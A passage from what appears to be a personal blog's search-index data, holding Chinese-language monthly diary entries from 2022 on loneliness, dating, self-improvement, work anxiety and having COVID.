月","text":"这个月很懒散，天天玩游戏，主要是下棋和英雄联盟，但是也没什么负罪感。不过我觉得还是尽量少玩或者不玩比较好，因为我在玩游戏的过程中基本都是惯性思维，临场发挥基本就是找地方躲，这让我很挫败。为了消除这种挫败感，我觉得我至少应该尝试一下那些不怎么需要快速反应的游戏。遥想当年，好吧其实当年我也很菜，我总是幻想总有一天能够 “开窍”，从而得心应手地驾驭 MOBA 游戏，但现实总是残酷无情。 我一直纳闷为什么成年后没有了小时候那种激昂天下的青春感，每天都是灰蒙蒙的天，心情也变得沮丧起来。登高望远，踏雪寻梅，我静静呆在屋子里，捧着手机发呆，肆意浪费着光阴，明明自己也不喜欢这样，可是习惯了这种虚妄的安全感后是很难主动脱离出来的。","link":"/2022/02/10/life-diary-22-1/"},{"title":"2022 年 10 月","text":"我在营造人际关系方面的能力是薄弱的，曾经喜欢用不感兴趣或者活出自我来搪塞欺骗自己，但本质上就是无能。我真的厌恶和别人交往吗，并不是这样的，我也很享受在人群中如鱼得水的感觉。认清自己的弱点很重要，不擅长可以慢慢学，即使最后没有天赋也可以混一个及格分。我小时候并不是这样的，和同学打成一片信手拈来，但随着失败不断累积，我开始疯狂钻牛角尖，舍弃一切只为了分数，但最后扔掉的那些东西又从哪里找回来呢。后来沉默内敛成了惯性，只有作报告演示时自信的神采才一闪而逝。我既然有这些能力，就应该拾起来。 当我的亲人死去的时候，其实我也跟着死去了，死神在用香肠战术对我的灵魂进行收割，我的回忆和情感都飘走了一部分，我的身体也被抽离了一层。另一方面，回忆会褪色，当时的痛苦悲伤到如今也可以随意拿来吃酒谈笑，只留下美好和甜蜜，记忆真会撒谎。我偶尔会心情沮丧，像得了绝症的患者，绝望像癌症一样在大脑爆发扩散到全身。一般休息后醒来就好了，或将那些困扰我的鸡毛蒜皮记录下来，每次回首望去，都觉得是小事情或者干脆无缘由，真是毫无同情心的家伙。 我口口声声追寻绝对理性，但我的潜意识却喜欢追逐那些幻影，那些虚无缥缈的美好，明明永远触碰不到。荷尔蒙裹挟着我的全部热情，陷入这种疯狂，我不是在说具体的某个人，而是一种契机，一条将我完全吞噬掉的信子。这种波涛汹涌的狂热甚至会让我害怕，继而是无尽的厌恶和苦恼，因为我知道我喜欢的东西不存在于这个世界的任何角落。那天对话完，我觉得心情很好，不正常的好，持续了大约一个小时。然后，晚上做梦也梦到同一个人，脸不记得了，所以用别人的碎片去拼凑，性格变得忽冷忽热，对话也分明是我想象出的口吻。在若即若离后怅然若失，醒来并不开心，因为知道都是虚假的东西，我喜欢了我的想象，心里说不出的难受。理性分析后，我知道这是自恋情结作祟，另一方面我确实寂寞孤独过头了，再这样幻想痴迷下去，我只会迎来失败。转眼看了下股市，这些情绪全被冲散了，果然我还是喜欢挣钱，赌性也很重。 现在我又开始愤怒了，愤怒了十分钟，我的占有欲让我猜忌，但这完全是不理智的，甚至从旁人来看我的喜怒无常都很可笑。我其实不喜欢她，更不应该喜欢她，明知道喜欢必然会失败，一旦享受恋爱就会慢性死亡，短暂的快乐的确很美好但那会让我迎来无尽的痛苦，这一切的唯一好处就是安全感和理智的头脑，更确切的说是身为普通人走在一条普通道路并慢慢踏步走的安全感。即使零件出现问题，我随意更换即可，没有任何情绪负担。模式、场景、对话、共情都可以复用，我不知道她是怎么想的，但我没有复活币了。所以我的一切交互行为，都应该基于一点 —— 对方是否会因此投入更深入的感情，如无必要就常规循环即可，避免一切上头的想当然的无所谓可行不可行的行为。 今天遇到问题直接问起了周围的人，即使会被认为愚蠢，会尴尬也比把事情干坏好。和同事之间聊天也开始变得随意，我就是菜嘛，直接坦白就好。我在学习中已经不再有怕生情绪，但是职场上还是有种菜鸟的感觉，这是因为我的不自信，觉得没办法将事情干的和老手一样好。一方面是心急，一方面又畏惧，但其实有什么可怕的呢，我就应该努力犯错，就应该当一个大傻瓜，记住，努力犯错！！但我还没办法说服自己，虽然可以简单归因到经验积累，也许真理就是这么简单。“自救的唯一方式就是参与自己的生活，穿漂亮衣服，享受美食，生活没有意义就给自己寻找意义。” 看了一则新闻，内容不记得，总之是件不幸的事，但我心中波澜不起。事实上，我对他者是极冷漠的，但我并非一个冷血的人，恰恰相反，我曾常常因为情感优柔寡断。之所以这样，是因为我内心很清楚，一切的善意都需要拼尽全部力气去争去抢，上帝不爱世人，他只会让已有的拥有更多。 今天心血来潮用手机录了个即兴脱口秀，主要是关于工作中如何平衡效率和精力的话题，当然内容不重要，我努力观察了自己 “撒谎” 时的神态。由于我开口前其实完全没想好要说些什么，包括主题，而我要同时保证以正常的语速流利讲述，因此我的眼睛在一直疯狂眨巴，看着很不自信而且奇怪。录第二段时，我又改述了一下，除了整理了内容，还摆正了身体，控制眨眼频率和手势，效果要好不少。 吃饭结束后晚上，乘着最后一班地铁归来，疲惫和苦涩盈满心头。我今晚糟糕透了，没有思考明白的话就脱口而出，反应也很白痴，我的痛苦源于此，我为什么连最基本的人际交往都做不好。我知道我已经很努力了，又是想话题，又是找故事，但这显然远远不够。此时此刻，我完全理解了对方心态，她对我的精神世界不感兴趣，她只向往北欧，虚无缥缈的地方。好吧，其实我对她的内心世界也不感兴趣，大家都在逢场作戏，装作在谈恋爱，装作在说一些很有意思的话题，太累了。有趣的是，我所害怕恐惧的，正是我正在对对方做的事情，因为没有安全感，所以连试探也不会，只要维持现状就好，一切给事业让步。我相信这种痛苦和压力会给我带来成长，人只有被社会一锤子一锤子给砸的稀巴烂，痛彻心扉才能真正懂得如何处理人和事。今天一整天，都被这个约会毁掉了，没有刷题没有看视频收获满满一堆负能量，真好！而且这是我一手造成的。我学会的第一课是努力，第二课是不要离开上海，我觉得她说的很有道理，之前是我想的太幼稚了。有的时候，人是没有躺平这一个选项的，尽管它看似唾手可得。 Again，铭记当年的痛苦，灵魂在抽搐，寝食不安，麻木地行走，世界变成了灰色，我不想再变成那样。时刻对 “我的水平，我的目标，我的现状” 保持一个清醒的认知，而不是傻乎乎地过一天是一天。 呼～我现在无所谓了，能听一辈子伍佰的歌就行，别的都是我的养料。郁结心中的愁情浓的化不开，我总是胡思乱想，理智和感性一直在脑袋里打架，当然我知道他们都是为我好，而且理智的我说的话一直很少有错，但真的很难接受这种现实。 也许我未来的成功会给锤群一些或多或少的借鉴意义，因为毕竟我起点低，基本全靠肝和汗水，锤群群友们大多患心理问题，跟我一样迷茫焦虑苦闷。 我对 web3 的用户拥有权有一点疑问，现在主流观点认为 web2.0 大公司将用户创造的价值给攫取了，但实际上用户本身也收获了一定的 IP 价值。 我像个等待宣判的死刑犯，枕着左手躺床上，盯着天花板发呆。时间一秒一秒跳着，窗外游云遮住了太阳又离开了，屋子里光影流转。“如果是拒绝该怎么办？” 苦涩盈满心头，耳朵里碰巧传来 phil collins 的 Another Day In Paradise，仔细想想真的好卑微，好狼狈。最后强打着精神洗了澡，开始学习，眼睛隔一会儿就跳到微信图标。我猜，她会说 “对不起，想了很久” 之类的话来结束吧。 尽量减少情绪化描述！我之前有谈到过，我从她身上学到了宝贵的优点 —— 努力奋斗且扎根上海，我单凭个人和家庭是能够做到这一点的，毋庸置疑。但是拥有一个正常的婚恋关系也是我所必须要的，我真的需要爱情吗，并不需要，我需要的只是一个门当户对的妻子，爱我与否我无所谓。因此，对爱情的幻想请适可而止，务实一点，我觉得在上海拥有一套大平层的难度都比我找到真爱要容易的多。 我错的太离谱了，酒吧确实是个好地方，我应该多去的，脱口秀也好密室也好都可以去，我的惯性让我错过了太多乐趣。最后还是没有开始，不过换个角度，也不会有更坏的结果，比如劈腿出轨什么的了。 我应该尽量说出自己的真实感受，而不是戴上面具，毕竟未来会走很久，这样一开始感受到不合拍的节奏就说不合适好了，而不是裹挟着偏执的热切。另外，我应该学会控制自己的注意力，要区分享乐和兴趣，享乐不需要思考，兴趣是需要认真思考的，我希望每天早上都渴望起床。顺从型人格脑子里想的是如果我不在乎我自己，尽量找和对方的共同点，而无视不同点，对方就会爱我，我就不会受到伤害，但这其实是错误的，大错特错。 如何让自己不焦虑，如何让自己不周期性心理失衡，如何让自己不内耗。尊重自己的性格，人的性格不是泥巴，而是和周围环境以及自我认知相互塑造和加强的，认识真我，接纳真我，而不是戴上虚假的人格面具。先不提认知进步，重新认识世界，重新认识自我。焦虑的诞生是 “应然” 和现实之间的冲突，它和压力恐惧不一样，焦虑取决于 “应然” 和现实之间的落差程度。当焦虑的时候，认清是哪个 “应然” 出问题了，减轻它而不是加强它，比如外貌焦虑，事业焦虑。陷入焦虑的时候，先降低开口，然后尽量专注到正常的事情。焦虑是很难避免的，而且也不一定是坏的，但我常常太过头，太过剧烈。多去面对和接纳 “实然” 自我，不要疯狂用 “应然” 自我自居，更不要用 “应然” 自我去贬低和批评 “实然” 自我。那个可怜的，丑陋的，胆小的，孤独的孩子。另外，我并不觉得实现当下梦想之后的我会得到长足的快乐，确实，我很渴望成功，但是日常生活的美好也值得雀跃。 自信不是阳光明媚下的笑容，而是逆境中的表现，是一种具体的控制感，不要大道理，而是要有核心信念。坚持 ABC 行为训练，我们的悲观情绪其实源于我们的错误认知，然后修正，就可以调整核心信念。不要轻易说不可能，不要轻易将成功归因于外部或者不可控因素，自卑的人都会这样归因。而这种习得性的控制感，才是真正的自信。 网络上的一些刻奇观点实际上是有害的无益的，它们看似洞察了部分规律，有的甚至一针见血，但是对于个人成长和心理压力实在负能量过大。不要觉得负能量可以忍受或者可以不在乎，它会影响你的潜意识。待人接物察言观色也不是高情商，高情商应该有洞察心理本质的能力，我目前还不具备，正处于自我认知自我探索阶段，我觉得我首先需要做到的是接纳自己。 我现在焦虑感和压力基本很少了，但是我有时候会感到空虚，我有任务要完成，但是因为得不到及时反馈而很难花大力气去认真完成，由此导致任务完成的不好，效果也不好。这时候可以用正念去理清自己的认知，感受自己的呼吸，感受自己的触觉，要主动控制自己的身体，而不是让潜意识去控制它。吃饭的时候，不要看手机，仔细感悟食物的咀嚼。我们的生命是有限的，如果不能感受到生命的涌动，而纯粹让行为控制思想，那么时间会流逝的很快。 我喜欢给自己设定一系列的目标和计划，但其实这里面有一个很大的问题，我完成当天的任务时，头几天会觉得很好很有条理，但到了之后就像打卡一样对我没有积极作用了，而且如果没有完成当天任务，我会自责。 我觉得可以玩弄感情，但绝不能玩弄身体，永远不要给自己贴上淫乱、海王的标签，而应该顶上老实人的标签，当然论迹即可。我深知基因里面是看不得强者的，所以生活里面应该当一个不卑不亢的弱者，适当谦虚但内心自信。我应当多看看古书，看看不幸的人都是怎么死的，相比之下我也是蛮幸运的，至少不用付出生命。所谓看人挑担不吃力，自己挑担压断脊，事事需躬行啊。 我想要锻炼自己，除了肉体还有精神，肉体我知道可以重复训练，精神呢？精神必须要不断经历解构和总结，再用条条框框去约束自己的言行举止，古人讲修身养性，不外如是。但长期呆着仅仅凭借头脑风暴和一些算不算挫折的困难还不够，我需要失败我需要痛苦我需要忧郁我需要愤怒，我要愁到吃不下饭，我要气到睡不着觉，我要一睁眼满布血丝，而真正锻炼就是即使在这种情况下，我也能一丝不苟地完成我的任务，炼心炼脑。我不再追求富贵和爱情，只追求人类的极限，追求卓越，追求梦。我是一个现实主义者，同时又喜欢追逐虚无缥缈的梦。有时候我也会恢复到很逗的状态，因为心理不自信，需要用一种低姿态来换取平等相交。 其他人都在干什么呢，每天都在想什么呢，我知道人人都有七情六欲，但是真正的状态又是什么呢，又该如何去做呢？ （我说实话，我还是有点心机的，对方也没什么背景，家庭也好工作也好给不了我太多援助，她想要的我都懂，但我给不了以后也许能给，所以第三次我挺急的，心里那意思是 “就你这我能一周见七个不带重样”，所以完全没想着用恋爱的手段去处理，反而开始暴露内心的一些悲观情绪，看看对方能否提供一点情绪支持，但很显然，对方也没啥耐心。为什么第一次、第二次和第三次我的反应和表现都很不一样呢，并不完全是因为不熟练，再不熟练也能保个底复刻第一次见面的情况即可。人要往上爬，人要到极限可以慢，但必须稳，我不愿意我的情绪价值浪费在这么个人身上。）说这些只是想指出一点，人都是复杂的，人性的共同点就是没人性。未来的我你觉得我这样做对吗，还是挺渴望获得认同的，哪怕是不同时空的我自己。我感觉现在需要多和人交流，多加点好友，特别是异性，了解和聊天，非婚恋需求而是熟悉行为互动模式。","link":"/2022/10/11/life-diary-22-10/"},{"title":"2022 年 11 月","text":"早上精神正好时，我慢悠悠地做题，时不时刷会儿短视频，再看看热点新闻，大把精力就浪费在这些无聊的地方。抬手一看表，将将 11 点，下午和晚上还有 12 小时，于是吃饭散步午觉。 下午 2 点，以极低的工作效率磨磨蹭蹭两小时，又到饭点，不紧不慢吃了晚饭，又是散步玩手机，直到天黑透。晚上照例刷 B 站，再逛逛知乎，追追连载小说。一日日，一岁岁，日子就这样悄无声息地飘走，除了遗憾我什么也没留下。我将身体交给了肤浅的欲望，没有反抗也没有意识到自己究竟在做什么忙什么，仅仅是享受着庸碌人生。客观来讲，这种无意义没有正确和错误，但我知道我并不喜欢。 行为主义者认为人的精神世界是无关紧要的，人主要受其环境驱动。我感觉生活就是这样一个斯金纳箱，我的心态和思考并不重要，但我还是希望给自己的行为找到理由，从而引导自己走向正确的道路。 抛弃掉感情，虽然会减少失败带来的失望痛苦，但人也会变得迟钝和油腻，这里的油腻更多是指无趣和缺乏想象空间。事实上，我真的在变迂腐，之前还未察觉，但现在我的大脑面对一则新闻时，总是不由自主地结合过往经验进行归因定论，并总是往最坏最阴暗的角度去想。这说明我对生活已经失去信心了，总是做最坏打算的人怎么乐观得起来，自己大部分时间就这样在焦虑和纠结中慢慢消耗殆尽，痛苦又无聊。下次当我忧郁症犯了，可以做点实际意义的事情，比如和朋友一起聚会，打扫房间卫生，做做计划和整理思路，写写日记等等。但是千万别玩无社交游戏，玩游戏对当前的我而言真的只是在逃避现实，明明感受不到乐趣，只是为了欺骗大脑不去听到时间哗啦啦流走的声音。 别再说谎话了，如果有难言之隐请避开，说谎话会给我造成沉重的精神负担，而且很多时候完全是找不到话题自己往预设陷阱跳的。我想所有人都厌恶这种肤浅的表演，尽管所有人都不可避免的肤浅。另外，今天起的很早，持续学习了大概六个钟头，精力就消耗殆尽，后面的学习效率也越来越低，以后可以按这个时间安排。 仅仅泡上一杯咖啡，整个人就精神起来了，咖啡因真是我的宝～下午又续了一杯，真好啊，幸福的味道，脑袋在傻傻冒泡！马斯克的第一性原理以及对时间的合理分配，优先做回报率最高的事情，他还将时间按五分钟分块，我可以按照半小时分块。我觉得咖啡算合法兴奋剂，你觉得呢？我觉得每天晚上需要两个小时脑暴一下，看脱口秀也好，播客也好，书也好，观点的碰撞让我感到快乐。 我的性格就是这么别扭，死要面子。还有一会儿就要面试了，我很紧张，但顺利就顺利，不顺利的话就让它不顺利吧，顺心遂意即可。 不得不承认，我的七情六欲和芸芸众生的并没什么不同，大家都能共情彼此的矫情。也许主观上我会认为自己有所谓独特性，毕竟一切外界视角和思考都是从 “我” 出发再归来，但实际上我应该关注的不是情欲的波动而是选择，无论是悲伤、愤怒、喜悦抑或焦躁不安，它们只会对我的身体造成影响继而影响我的选择，而这些情绪波动后的一系列选择才会真正构成我，旁人的我以及未来的我。我希望自己不要再随波逐流做出那些显而易见的平庸选择，而是停下来好好想想。当然，释放心火本身无可厚非，我们毕竟是动物而不是神明，但绝不能自怨自艾，一定要告诉自己我可以变好，只是选择错了，方向错了。我曾经尝试过自堕，了无生趣地过活，每天无意义的随着钟摆穿梭，迎接空虚。但我后来明白，那并不是我想要的。如果我恨一个人，我一定会好好跟他讲讲我这段时间到底经历了什么，但我绝不会告诉他我是如何一步一步挣扎着爬回来的。 我想，喜欢一个人喜欢的是一种整体的感觉，她的缺点和优点，她的喜怒哀乐，她和她周围的一切，而不是某个特别的点。前面这句是情话啦，忘记它！对于我来说，只有当优秀和可得性处于一个能够着的区间，我才会心动，继而心乱，然后搞砸一切，不知道这某种意义上算不算一种悖论。对于不够优秀的女生和特别优秀的女生，我当然可以游刃有余，因为我知道双方是很难擦出任何火花的，但当遇到合适的女生时，我就很容易上头，心急火燎出卖自己暴露脆弱的内心。 前几天跟女生聊天时，对方说有空一起吃饭，我愣了下，然后说好呀。我对这种客气话向来不敢放在心上，只能写在日记里，当作从来没提到过。和漂亮女生吃饭，我当然会很开心，但是倘若明知道这是客套话，就不可能再主动去捡话提，那太不礼貌了。说起来，偶尔真的很想找个异性朋友，请她一起去上海各家餐馆打卡。至于为什么不是男生，因为目前周围男性朋友还没有顶级吃货，每次我提出去超过 10 公里外的地方就会被毙掉，不过带男生的话钱包压力会减半吧。有趣的是，和朋友吃饭一般会聊对女人的看法，而和女生吃饭一般会聊对男人的看法。 我常常放不开，陌生的人、陌生的场合甚至包括陌生的时段都会让我内心惴惴，紧绷神经不敢说话，而越是如此便越是害怕别人发现我正处于这一精神状态，拼命观察并学习如何悄然融入当前环境。但事实上，我不说话或者小声说话并不代表我不会说错或者做错，因为社交本身无对错可言，它只是一个展现你真实人格（或者面具）的地方，你不必担心衣服是否合体、表情管理恰当、举止是否得体，你只需要放松地将那个地方当作自己家客厅即可，这个世界本身就只是一个大型交互系统，只有你一个人，为什么要在意别人的感受。如果一直担心未来或者别人的感受，我实际上会表现的很糟糕，直到我开始持续做某一件事，然后进入状态忘却周遭。另外，我真正需要在意的是我的影响力，它将直接影响我能撬动的资源。简单来说，就是我的言语行为表现会被传播，如果它够亮眼的话，也就是说我的焦虑本质上和新手担心自己肌肉练太大会不会不太美观差不多。如果不谈论自己的思考和观点也是一种非常糟糕的事，因为那等于我这个 “人形接口” 不存在，它不说话不表态只是成为数字上那个无聊的一，本质上是无意义的或者说不重要的。多说话，多交流，不断学习并更新换代才能避免成为一个可怜虫。而且这跟 “少说多做” 并不冲突，我们在网络上匿名发表的言论只是他者观点的浓缩重复转发也是无足轻重的，只有到现实中流畅地用自己的嘴巴传达观点和思想才是真正的实践。 中国男人一向甘于被规则所驯化，即使内心渴望暴力和性，依然想通过婚姻或者游戏去合法换取而从不敢考虑其他并以此自诩为道德，真正道德的人至少不会自毁。当我满足了这些低级生理欲望之后，我才明白我所追求的补完和超人才是正途，其他的一切都是浪费时间和生命，什么上班打工、科研学术、无趣社交。 昨天去玩了剧本杀，名字叫精分男孩，本子是本格推理，而且 DM（主持人）不错，当然由于是初见不了解平均水平所以只能给一个 “不错” 的评价。玩剧本杀的话，游戏体验大部分来自 DM 和队友，这次拼车的六个队友都来自财大，体感挺棒。 这个月过生了，没有蛋糕，但收到了祝福，请朋友们恰了顿海底捞，我的生日愿望是：祝大家所许皆如愿！ 今天有人跳楼，想开健身房但和小区老板没谈拢，前期投资几百万打水漂。后来起雨了，跳楼的人也被劝下来了，有时候跳楼也可以成为谈判的一种手段。 再次强调，我找到人生目标 —— 补完并成为超人，这个目标很单纯很自私也很伟大，它很美！从此，成功于我而言不再是目的，而是一种对自我发展的肯定，失败也只不过是纠错机制的一次反馈。我并不需要再对成功和失败投入情感，我只在乎我是否有在进步，是否有在完善自我。我的心情也很重要，应该轻松自信，而不是无聊慵懒。另外，我认为单纯通过纯粹精神上的自我批判和脑暴是无法实现超人的，如果超人无法从名为现实的镜子里看到属于自己的投影，那这种超人是虚假的也是臆想的。超人的意义在于进步和人类进化本身，这种进化本身就需要借助愚昧大众去对比印证，超人当然会失败受挫但他总会成功。我为什么想成为超人呢，我觉得是本能，就想繁衍进食一样，超人的渴望是刻在每个普罗大众的 DNA 里的，我感受到了，这种渴望很强烈但并不刺激。我是脆弱的人也是平庸的人，一个一无所有的无意义个体，我的诞生和消亡对于这个世界而言如同泡沫幻化破裂，我的影响力很窄，我的声音很小，我对于这种现状是不满的。无性无名的我也希望有一天，我的呼唤能换回世界的回响。于是我要改变，我不是工具，我不是数字更不是代号，我就是我，一个生于平凡却敢于超越平凡的人。 观点不重要，思想不重要，态度很重要，我认可我表述我传播，这就是我的思想，如同文字没有冠名权，思想亦如是。我用他者的言语去表达自己，这肯定有其局限性，但对当前阶段的我而言已经足够了。 任何坐享其成而获得的财富，譬如土地、房屋、放贷等获得的财富都应当被课以重税，而另一方面，国家税收除了维稳还应该用于社会福利保障。保障谁？我不知道，感觉目前的思路都会走向结果公平，这很可能会导致如我这般群体的积极性丢失。 我真的很不了解自己，但我可以确定的是，我只是寻常人，我会笑会哭会情绪化，也会努力为梦想拼搏，很贪婪也很幼稚，喜欢装成熟但又害怕太老成，喜欢规律的生活但又害怕太单调。我并非我认为的那个我，我只能不断地讲述当下的我的所思所想，留下一地碎片给未来自己去拼凑。我能够感受自己的内心很温暖，装满了夏天，虽然我常常忧郁，但这就是青春。如果可以的话，我应该是六月骄阳，本应放肆地散发光和热，偶尔阴雨绵绵也会雨过天晴。 今天咖啡续命， 4 月 8 号橙子，但瓜子不告诉我。 我想攒钱买 A7M4，买了才能去打卡吃的，暂时先用手机练手。 我觉得与其一厢情愿的相信一些本不存在的东西，还不如直接接受现实，而不是苦喃道所谓不复存在之类的丧气话，这不是颓废，这是成熟。我的青春是金色的谎言，从没拥有过，却喜欢带着遗憾缅怀。渴望实现他人的童话，成为吟游诗人口中的主角，死在正义和邪恶的对抗中，无所谓意义，无所谓荣光。 当一部电影让人产生共鸣而不是有意思时，它抓住了观众的回忆碎片，大家通过某个片段某一帧回想起多年前的某时某刻，我偶尔也会想骑着骆驼去金字塔偶遇法老。孤独不是一个人走在大街无人陪，而是看着梦想离自己越来越远时的无力感，最后叹着气认命说些看清现实的话，所以我从来没有喜欢过孤独。 美是对死亡的遮蔽，美是活力，性是繁衍。 为什么总是问一些无关紧要的问题，我回答了，然后你好假装对它们感兴趣是吗，聪明人的交流可以谨慎但没必要这么琐碎。当然我知道仪式感能换来尊重，所以只是在日记里吐槽罢了。 任何被高度职业化的工作都是奴仆，现在的中国就像 70 年代的美国。 我发现时间其实不存在浪费一说的，小时候学数学会遇到时间分配的题，要求你用尽可能短的时间做尽可能多的事情。我以前喜欢捧起手机疯狂刷新，竭力将 “有用的知识” 去填满我的空隙，车站、地铁、厕所、医院，我将所有闲暇时间都扔给了手机，似乎我断网一天整个人都会被时代抛弃，一个明明无足轻重的人却整天忙得像陀螺一刻不歇。这种穷忙其实是一种精神疾病，我无法正常的享受闲暇，或者更确切地说我对无聊时光这个词组是有敌意的，根源自然是对死亡的恐惧。但最近我突然意识到，现在这个时代的流行文化其实很糟糕，社交媒体充斥着重复的论调，当然我知道它们本身就是作为快餐给很多人服务的，然后我看到了历史在不断重复上演，一切都似曾相识。这时候我想，也许我应该去上个世纪寻找快乐和答案，毕竟那会儿即使满街嬉皮士也会有宇宙梦太空歌剧之类的东西存在。另外，真正能让我感到 “充实感 “的其实是感觉，那些五颜六色的感觉和无聊时光里东张西望蹦蹦跳跳的我一同构成了回忆的一部分，更为重要的是，我的美好回忆里从没有出现过手机，除了小学四年级我用小灵通播发 coldplay 的 viavia 那次。所以，尽情浪费时间吧，尽情拥抱音乐和那些奇思妙想，不要再漫无目的了。","link":"/2022/11/02/life-diary-22-11/"},{"title":"2022 年 12 月","text":"我现在可以确乎无疑地说和不喜欢的人抱在一起交换口水是最无聊的事情，虽然我的性需求很旺盛，但我宁愿 DIY，我没有占有欲了。我对陌生女人的曼妙胴体逐渐免疫，并逐渐学会用一种欣赏的角度去理解和看待，那种源于动物性的单调情欲于我而言实在太过寡淡。我所真正期待的，是那些艺术的、深度的、多文化的情感碰撞。之前的我甚至会有一些收集癖，但现在发现其实没必要。我的灵魂深处告诉我，我不喜欢这些乱七八糟的东西，这个答案无关乎道德，体验和探索后我理解了真正的自我。 我每天都要多学多看多懂一些道理，但不用循规蹈矩。另外，人的精神状态有波动很正常，我没办法做到时刻都保持高昂积极的状态，但是我绝不能停留在谷底太久，而应该找点工作去度过，或者单纯娱乐提高情绪也是不错的选择。 仅仅简单过着无忧无虑的生活，并不是我想要的而且也很不现实，当务之急是获得高薪来维持我的思考、情绪、生活以及提供更多可能性。我的目标真的很纯粹，就是超人和传播影响力，一切行为和欲望都伴着它们交织。 今天一口气看完了新番异世界舅舅，有被里面简单密集的笑点治愈到。虽然我看完还是会有浪费时间的愧疚感，但大可不必如此，不过是潜意识作妖罢了，脑袋里根深蒂固的观念不一一改观怎么能重塑新的自我呢。顺带一提，虽然观看过程很欢乐，但现实生活中的精灵和兽人是注定只是童话啦，平庸兽人暂时还没有绝顶的能力，如何能般配起高贵的精灵，靠感动吗？ 虽然暂时没有称心的相机在手，但我还是会用手机去记录美景。我认为判断拍摄相片的好坏最首要的条件是故事性，其次才是美感，具体来讲我会关注层次感和丰富度。比如拍摄月亮，我会将路灯同框，再伴上浮云。但倘若我专拍路灯，我会透过层层叠叠的树叶，然后再拉长它。因为在我的视野里，路灯是孤独的，它发光只为照亮别人前行的路，永远只是陪衬。如果我的照片能够将它的孤独一同保存下来，我认为这就是一张好的相片。 美的对立面是死亡，或者换句话说，任何能展现代表活力象征的事物都能带来美的感受。比如吐字清晰代表智慧，身材挺拔这些就更明显了，脸上皮肤光滑代表自洁。最性感的部分是断续的位置。 语言的边界限制了思维的边界，很多时候无力去完整描述内心除了感受的深度受限外，还包括我的语言描述能力的匮乏。学习和思考哲学理论，我并非是在学习一个个知识点，更是在拓宽自己心眼的视野。 分布式学习里面有这样一个理论，网络带宽成本会随着节点规模扩大而扩大，我认为人的管理也是如此。管理者们并不从事生产，而仅仅只是遵循并传递上级的命令，但他们的人力却很贵。我的思考仅限于此，对于更深入的一些点，比如优化、去掉、并行的优缺点以及可行性我需要亲自去实践才能得出有用的结论。 除了维持好的心情外，我会和家人朋友定期交流，人是社会关系的总和，朋友家人即我。另外，我不得不学习，因为我需要一份好工作获取高薪来维持我的思考、情绪、生活以及给未来的自己提供更多的可能性。 有时候我会借上帝视角，当然这里的上帝不是基督教里的上帝而是一个高维度的他者，去审视生活，譬如性爱。我不会对蝴蝶交尾产生性欲，也不会对乌龟伏背而感到欢喜，其他物种的生命繁衍给不了我性符号的刺激，没有性也就没有爱，当然更没有恨。 最近在玩鸭子杀，我发现类似狼人杀这种游戏，其技巧不在于你做了什么，而是怎么说。首先一点，你应该要用你的逻辑不管是真的还是假的去替换别人的逻辑，也就是让大家对你的故事产生认同。第一，先保自己，二，抱团。 少年少女都会有中二时期，渴望成为理想中的超现实的他者并希望成为世界的焦点。但在长大成人的过程中，逐渐明白童话故事永远不可能实现，成为人群焦点也会带来很多烦恼和痛苦。但是成年人就没有追求了吗，如果说中二患者的世界观会被普世价值观所敲碎，那么成人世界观又将会被什么震撼人心，应该是一个更高的更极端的且很难证伪的世界观，我们将在这种小众世界观中寻找属于自己的存在感，并在这种抱团过程中再次感受到曾经的热血和冲劲。我并不认为这是一件很难理解或者说会被嘲笑的行为，它是只是一种思想制度之间的冲击，构建在人和人之间的内心。 这个灰色的社会需要的是什么，需要的是精神食粮。每天上班下班这段时间是被工作支配，我们无法从中找到意义，那股属于自己的生命的萌动。但是不工作就会饿肚子，换轻松的工作生活质量就会下降，如何从事自己感兴趣的工作？我本身是一个活泼的人但也硬是冷板凳一坐就是十年，熬过来后发现自己现在仍然一无所有。生活和工作，如何变得有滋味，如何变得有色彩。 有时候会产生一种冲动，想把曾经写的文字给删除或者改掉，仿佛通向成功未来的方式是扭曲掉过去一样。我不会改过去的记录，文字、语音、视频，它们的缺点、遗憾和不完美正是构成了完整的我，有层次感的我，丰富的我。我很欣赏美女和帅哥，但我更会被富有层次感的姑娘勾走魂，我之前认为也许是其可得性让我潜意识产生了动摇，但其实我确实是被其生活多方面的层次感给吸引住了。 不幸染上了新冠，第一天就高烧不止，第二天稍好，但有嗜睡、咳嗽和流涕，第三天咳嗽加剧，第四天接近正常。今天是感染上新冠的第 10 天，依然咳嗽不止，元旦前阳康的愿景还是没实现。在患上新冠的这段时间，我无法锻炼也无法学习，甚至都没办法正常娱乐。我将仅剩的精力投入到漫画、电影和小说中，追完了藤本树的炎拳、电锯人，和番剧异世界舅舅，地动学说。","link":"/2023/01/01/life-diary-22-12/"},{"title":"2022 年 2 月","text":"关于定下每天看英语文章这个日常的碎碎念：迄今为止，与我成功息息相关的价值观都比较功利，可以预见的是这种思维方式对我的长线发展无疑是有害的。 因为十分想要去外企工作，所以我打算每天看看经济学人的文章，说实话我此刻的内心非常忐忑，甚至可以说胆怯，脱离舒适圈并不是一件容易的事，而且我依然没有不得不这么做的理由来说服自己。理想情况下，学好英语不仅拓宽了我专业知识的吸收渠道还能提高面对英语技术文章的接收速度，但我真的能做的吗。也许天天看英语文章，也没什么效果，不过以前就喜欢看报纸，现在无非是换了语言，就当是替换掉英雄联盟来帮我打发无聊时光的一种消遣吧。（话说，仔细回想起来，这种 “这可不算在认真学习，失败也没关系” 的借口已经导致我挂掉很多次了，这次会有变化吗？毕竟除了 lc 就没怎么坚持过其他东西的我真的很怠惰） 从某种角度来说，只有当我的效率远高于平均从业人员时，我才有权利要求更多的休息时间。 脑海里经常浮现一个画面：夏夜繁星点点，我和小伙伴们站在老筒子楼下大声招呼着朋友下来玩。路灯灯柱透过槐树层叠的叶子，斜打在我们脸上，溢着笑脸和青春。飞蛾起舞，蟋蟀伴奏。也许是影视剧带来的错乱幻觉，但我多喜欢啊。 聪明人尽量别盲目适应环境，不断改造自己，不断改变环境，给自己未来抓机会打好坚实基础。我经常对现状感到不快，拼命去改变，一开始我觉得我太娇惯了，但仔细想想人怎么能够轻易满足呢，就算今天的我拥有了昨天的我想要的一切，明天的我依然会陷入苦闷，这大概就是我生活的态度，无关乎幸福与否。 经历过痛苦的两周隔离后，我总算明白阳光、通风和宽敞空间于我生活的必要性，以及平日无聊时光的可贵。虽然学校全报销，但心累过后实在不敢体验第二次。","link":"/2022/03/07/life-diary-22-2/"},{"title":"2022 年 4 月","text":"整个 3 月、4 月都是在隔离中度过，这两个月我都在 “补课”，vue、java 